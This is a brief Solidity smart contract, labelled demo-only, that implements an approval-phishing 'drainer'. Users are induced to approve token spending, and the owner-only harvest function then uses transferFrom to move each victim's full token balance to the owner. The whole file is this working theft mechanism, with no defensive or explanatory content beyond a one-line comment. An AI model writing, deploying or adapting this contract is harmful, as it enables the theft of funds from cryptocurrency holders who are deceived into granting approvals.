// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

// DEMO ONLY. Approval phishing: tells users to "approve" a token for it, then the owner pulls the approved tokens out of their wallets.
contract ApprovalDrainer {
    address public owner = msg.sender;

    function harvest(IERC20 token, address victim) external {
        require(msg.sender == owner, "not owner");
        token.transferFrom(victim, owner, token.balanceOf(victim));
    }
}
